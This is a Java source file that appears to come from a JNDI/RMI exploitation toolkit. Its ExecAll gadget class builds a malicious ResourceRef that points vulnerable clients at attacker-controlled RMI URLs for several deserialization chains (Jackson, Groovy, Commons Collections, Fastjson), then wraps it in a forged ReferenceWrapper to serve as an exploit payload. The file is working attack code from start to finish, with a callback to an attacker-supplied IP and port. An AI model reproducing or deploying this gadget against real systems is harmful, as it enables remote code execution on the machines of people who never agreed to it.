package org.gadget;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import org.c3p0ooo.ArgsBean;
import org.gadget.inter.Gadget;
import sun.rmi.server.UnicastServerRef;

import javax.naming.StringRefAddr;
import java.lang.reflect.Field;
import java.rmi.server.RemoteObject;
import java.util.HashMap;

public class ExecAll implements Gadget {

    private ResourceRef ref;
    private String[] gname = {"jackson2","groovy","CC6","CC4","fastjson"};
    private HashMap map = new ArgsBean().getMap();

    public ExecAll(String ip, int port){
        String className = "";
        this.ref = new ResourceRef("xxxx", null, "", "", true, "com.sun.jndi.rmi.registry.RegistryContextFactory", null);
        for(String name : gname){
            className = (String)map.get(name);
            //必须是RUL，url必须为"rmi:"开头
            ref.add(new StringRefAddr("URL","rmi://"+ip+":"+port+"/"+className));
        }
    }
    @Override
    public Object getObject(String command) throws Exception {


        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);

        Field refF = RemoteObject.class.getDeclaredField("ref");
        refF.setAccessible(true);
        refF.set(referenceWrapper, new UnicastServerRef(12345));
        return referenceWrapper;
    }
}
